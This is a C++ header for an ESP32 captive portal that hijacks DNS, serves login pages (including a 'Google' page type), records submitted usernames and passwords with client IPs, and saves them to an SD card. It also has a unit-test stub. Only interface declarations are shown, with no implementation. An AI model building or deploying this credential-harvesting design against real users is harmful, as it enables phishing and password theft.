#pragma once

/**
 * @file arduino_captive.h
 * @brief Captive Portal using standard Arduino DNSServer and WebServer
 * 
 * This implementation uses the proven Arduino libraries for ESP32
 * instead of custom socket code, ensuring better compatibility.
 */

#ifndef UNIT_TEST

#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>
#include <functional>
#include <vector>
#include "ap_types.h"  // For PortalPageType enum

namespace ap {

/**
 * @brief Captured credential entry
 */
struct ArduinoCapturedCredential {
    char username[64] = {0};
    char password[64] = {0};
    char clientIP[16] = {0};
    uint32_t timestamp = 0;
};

/**
 * @brief Arduino-based Captive Portal with DNS hijacking
 * 
 * Uses standard Arduino DNSServer and WebServer libraries
 * for reliable captive portal functionality.
 */
class ArduinoCaptivePortal {
public:
    using CredentialCallback = std::function<void(const ArduinoCapturedCredential&)>;
    
    ArduinoCaptivePortal();
    ~ArduinoCaptivePortal();
    
    /**
     * @brief Start the captive portal
     * @param title Portal page title
     * @return true if started successfully
     */
    bool start(const char* title = "Network Login");
    
    /**
     * @brief Stop the captive portal
     */
    void stop();
    
    /**
     * @brief Process DNS and HTTP requests (call in loop)
     */
    void handleRequests();
    
    /**
     * @brief Check if portal is running
     */
    bool isRunning() const;
    
    /**
     * @brief Get captured credentials
     */
    const ArduinoCapturedCredential* getCredentialsArray() const;
    
    /**
     * @brief Get credentials as vector (for compatibility)
     */
    std::vector<ArduinoCapturedCredential> getCredentials() const;
    
    /**
     * @brief Get credential count
     */
    size_t getCredentialCount() const;
    
    /**
     * @brief Get HTTP request count
     */
    uint32_t getRequestCount() const;
    
    /**
     * @brief Get DNS query count
     */
    uint32_t getDnsQueryCount() const;
    
    /**
     * @brief Set credential capture callback
     */
    void onCredentialCaptured(CredentialCallback callback);
    
    /**
     * @brief Clear captured credentials
     */
    void clearCredentials();
    
    /**
     * @brief Set the current SSID (used for credential filename)
     */
    void setSSID(const char* ssid);
    
    /**
     * @brief Set the portal page type (Generic, Google, etc.)
     */
    void setPageType(PortalPageType type) { pageType_ = type; }
    
    /**
     * @brief Save all credentials to SD card as JSON
     * @return true if saved successfully
     */
    bool saveCredentialsToSD();

private:
    DNSServer* dnsServer_ = nullptr;    // Pointer - recreated each start to fully release socket
    WebServer* webServer_ = nullptr;    // Pointer - recreated each start
    bool running_ = false;
    uint32_t requestCount_ = 0;
    uint32_t dnsQueryCount_ = 0;
    char portalTitle_[64] = {0};
    
    // Use fixed array instead of vector to avoid potential heap issues
    static constexpr size_t MAX_CREDENTIALS = 32;
    ArduinoCapturedCredential credentialsArray_[MAX_CREDENTIALS];
    size_t credentialCount_ = 0;
    CredentialCallback onCredential_;
    
    void setupRoutes();
    void handleRoot();
    void handleCaptiveRedirect();  // 302 redirect for captive portal detection
    void handleLogin();
    void handleNotFound();
    String getPortalHTML();
    String getSuccessHTML();
    
    // Current SSID for credential filename
    char currentSSID_[33] = {0};
    
    // Portal page type
    PortalPageType pageType_ = PortalPageType::GENERIC_LOGIN;
};

} // namespace ap

#else
// Minimal stub for unit tests
#include <cstdint>
#include <cstring>
#include <functional>
#include <vector>

namespace ap {

struct ArduinoCapturedCredential {
    char username[64] = {0};
    char password[64] = {0};
    char clientIP[16] = {0};
    uint32_t timestamp = 0;
};

class ArduinoCaptivePortal {
public:
    using CredentialCallback = std::function<void(const ArduinoCapturedCredential&)>;
    
    bool start(const char* title = "Network Login") { (void)title; running_ = true; return true; }
    void stop() { running_ = false; }
    void handleRequests() {}
    bool isRunning() const { return running_; }
    std::vector<ArduinoCapturedCredential> getCredentials() const { return credentials_; }
    const ArduinoCapturedCredential* getCredentialsArray() const { return credentials_.data(); }
    size_t getCredentialCount() const { return credentials_.size(); }
    uint32_t getRequestCount() const { return 0; }
    uint32_t getDnsQueryCount() const { return 0; }
    void onCredentialCaptured(CredentialCallback callback) { onCredential_ = callback; }
    void clearCredentials() { credentials_.clear(); }
    
private:
    bool running_ = false;
    std::vector<ArduinoCapturedCredential> credentials_;
    CredentialCallback onCredential_;
};

} // namespace ap

#endif // UNIT_TEST
